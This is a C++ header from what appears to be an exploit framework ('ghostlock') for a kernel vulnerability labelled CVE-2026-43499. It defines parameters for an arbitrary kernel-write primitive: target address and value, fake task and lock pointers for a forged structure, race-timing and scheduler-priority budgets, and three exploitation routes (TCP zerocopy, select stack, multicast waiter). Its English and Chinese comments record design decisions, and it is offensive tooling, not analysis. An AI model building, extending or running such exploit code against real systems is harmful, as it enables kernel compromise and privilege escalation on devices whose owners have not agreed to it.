#pragma once
/** @file backend/cve_2026_43499/access_params.hpp
 *  What this backend's kernel access needs besides an address and a value: which route, and
 *  where in it.
 *
 *  The route is a parameter rather than a separate object on purpose. The user's rule: one
 *  KernelAccess per backend, because the id that names it is a backend and not a route -- a
 *  route object per route would turn the route into an assembly axis, which it is not. So the
 *  caller says which route it wants in the parameters, the access brings that route up inside
 *  initialize and reclaims it in shutdown, and construction does none of that work.
 *
 *  Lifetime that follows from this: the route lives from initialize to shutdown and serves every
 *  access in between. The window inside one access is still scoped to that access -- it is a race
 *  scope and reclaims on every exit path -- but the route, its carrier and the landing gear it
 *  set up outlive the individual write. Switching routes means shutting down and initializing
 *  again, which is why the state a capability reports has a Closed as well as a Declared.
 */
#include <concepts>
#include <cstdint>
#include <string_view>

#include "backend/cve_2026_43499/memory/write_request.hpp"
#include "contract/kernel_access.hpp"
#include "platform/route_catalog.hpp"

namespace ghostlock::backend::cve_2026_43499 {
    /** Parameters for this backend. The route is what initialize reads; the offset is what an
     *  access reads. Both travel in the same object so a caller can set them once and keep
     *  using it, and an entry point refuses what it needs but does not find rather than
     *  substituting a default. */
    /* 旧码（原文保留 ✓）：
     *     class AccessParams final : public contract::KernelAccess::AccessMiscParameters {   // 旧名原文
     *  TODO(access-split): `final` 与 2026-10-12「三个 route 各建子类」裁定冲突 ——
     *  子类须继承本类，故去掉 `final`。完成 = 三子类落地且门禁全绿 + 用户确认 ⇒ 删本注释块。 */
    class Access43499Parameters : public contract::KernelAccess::AccessMiscParameters {
    public:
        /** The route the access should use. Unset means not decided, which initialize refuses. */
        profile::RouteId route = profile::RouteId::Unset;
        /** Where in that route to write. Zero is a legitimate offset, so it is not a sentinel. */
        std::uint64_t offset = 0U;
        /** Whether the offset has been given at all, since zero is legitimate. */
        bool offset_set = false;
        /* 2026-10-17：原来的 `const profile::Document *document` 成员已删 —— 它是旧 CLI 读 GLKv3 文档
         * 的入口，JNI 从不设置它（同文件下方 2026-10-12 的注释也记着「document 需求试过又撤回」）。 */

        /* ---- What the route assembly needs from outside (named in the sample cpps) ----
         *
         * The retired route's numbers, collected where the sample files put them: the profile carries
         * the geometry and the budgets, and the caller carries the timings and the consumer's policy,
         * because a run's patience is not a fact about the kernel. They are declared here -- one place
         * a caller fills -- and the assembly reads them from this object when it is wired to the
         * access. Until then they are validated here and nowhere else, which is the honest state: a
         * half-specified set is refused by name rather than defaulted. */

        /** The stamp's geometry: where the two pointers sit inside it, and how long it is. From the
         *  route section of the profile. A zero here is refused because the encoder cannot place a
         *  field in a buffer it was not told the size of. */
        std::uint64_t stamp_waiter_offset = 0U;
        std::uint64_t stamp_task_offset = 0U;
        std::uint64_t stamp_lock_offset = 0U;
        std::uint64_t stamp_buffer_size = 0U;
        /** The attempt budget, how long a round is held, and how many opening rounds do not arm the
         *  consumer: the profile's route section, and the shape the sample file documents. */
        std::uint32_t max_attempts = 0U;
        std::uint32_t arm_hold = 0U;
        std::uint32_t arm_sequence = 0U;
        /** The caller's patience: how long the waiter parks, how long the chain is given to settle,
         *  how long the consumer waits inside a round, and how many calls a round makes. */
        std::uint32_t park_ms = 0U;
        std::uint32_t settle_us = 0U;
        std::uint32_t consumer_delay_us = 0U;
        std::uint32_t burst_calls = 0U;
        std::uint32_t max_calls = 0U;
        std::uint32_t fallback_lock_us = 0U;
        /** The consumer's rotation and policy: which scheduling policy its calls set, and the modulus
         *  its nice values walk so one of them lands. */
        std::uint32_t nice_modulus = 0U;
        std::uint32_t policy = 0U;
        /** The two addresses the prepared region supplies, and the pair the payload page was built
         *  for: an attempt for a different pair is refused, because the tuple that decides what gets
         *  written lives in the page and not in the call. */
        std::uint64_t fake_task = 0U;
        std::uint64_t fake_lock = 0U;
        std::uint64_t target = 0U;
        std::uint64_t value = 0U;
        /** 本步写形状：由 `WordWrite43499.form` 映射而来；Disabled 在 write 前具名拒绝。 */
        memory::WriteMode write_mode = memory::WriteMode::Disabled;
        /** 是否保留目标原有字节；与 write_mode 一起决定页/编码。 */
        bool preserve_child = false;

        /** Whether the assembly inputs are all present. They are one set: a caller that supplies some
         *  of them is not half-ready, it is wrong, because the route engine reads them together. */
        [[nodiscard]] constexpr bool assembly_complete() const noexcept {
            return stamp_buffer_size != 0U && stamp_task_offset != 0U && stamp_lock_offset != 0U &&
                   max_attempts != 0U && arm_hold != 0U && arm_sequence != 0U && park_ms != 0U &&
                   burst_calls != 0U && max_calls != 0U && nice_modulus != 0U && fake_task != 0U &&
                   fake_lock != 0U;
        }

        [[nodiscard]] std::string_view name() const noexcept override { return "cve_2026_43499"; }

        /** Whether this set is complete enough for initialize: it needs a route.
         *  //TODO(access-assembly): the document requirement was tried here and reverted the same day
         *  (2026-10-10): host `make -C core check` failed 14 cases in `cve-2026-43499 access`, because
         *  the contract's tests declare a route and nothing else. The document is checked where the
         *  assembly reads it, with a named refusal; complete when the assembly exists and its tests
         *  carry a document, at which point this door may demand one again. */
        [[nodiscard]] constexpr bool usable_for_initialize() const noexcept {
            return route != profile::RouteId::Unset;
            // return route != profile::RouteId::Unset && document != nullptr;
        }
        /** Whether this set is complete enough for a write: it needs both. */
        [[nodiscard]] constexpr bool usable_for_access() const noexcept {
            return usable_for_initialize() && offset_set;
        }
    };

    /* ------------------------------------------------------------------------
     *  Per-route parameter sets (2026-10-12 ruling: init carries this route's
     *  parameters).  Each route declares only what it alone knows; the shared
     *  fields above stay in the base.  A subclass must NOT override name():
     *  name() is the BACKEND identity that KernelAccess43499::as_params matches
     *  on, and a route that answered another string would be refused as if it
     *  came from a different backend.  The route is identified by dynamic_cast
     *  (RTTI enabled the same day) plus the RouteId in the base.
     * ------------------------------------------------------------------------ */

    /** The route a parameter set belongs to, as the subclass's compile-time tag. */
    template <class P>
    concept RouteParams = std::derived_from<P, Access43499Parameters> && requires {
        { P::kRoute } -> std::convertible_to<profile::RouteId>;
    };

    /** Parameters only the TCP-zerocopy route needs. */
    class TcpZerocopy43499Parameters final : public Access43499Parameters {
    public:
        static constexpr profile::RouteId kRoute = profile::RouteId::TcpZerocopy;
        /** The zerocopy map length the carrier is built for; zero is refused by the route. */
        std::uint64_t zerocopy_map_bytes = 0U;
    };

    /** Parameters only the select-stack route needs: the fd_set geometry. */
    class SelectStack43499Parameters final : public Access43499Parameters {
    public:
        static constexpr profile::RouteId kRoute = profile::RouteId::SelectStack;
        /** The waiter word shift inside the fd_set, and how many words the set carries. */
        std::uint32_t waiter_shift = 0U;
        std::uint32_t fd_count = 0U;
    };

    /** Parameters only the multicast-waiter route needs.  The multi-step arm work
     *  (socket, stamp packing, MCAST_BLOCK_SOURCE) is NOT write logic: it belongs to
     *  the upper-layer prepare_multicast_route() wrapper, per the same ruling. */
    class Multicast43499Parameters final : public Access43499Parameters {
    public:
        static constexpr profile::RouteId kRoute = profile::RouteId::MulticastWaiter;
        /** How many rounds the arm may take before the route reports it did not land. */
        std::uint32_t arm_rounds = 0U;
        /** The waiter word shift the stamp is decoded with. */
        std::uint32_t stamp_waiter_shift = 0U;
    };
}  // namespace ghostlock::backend::cve_2026_43499
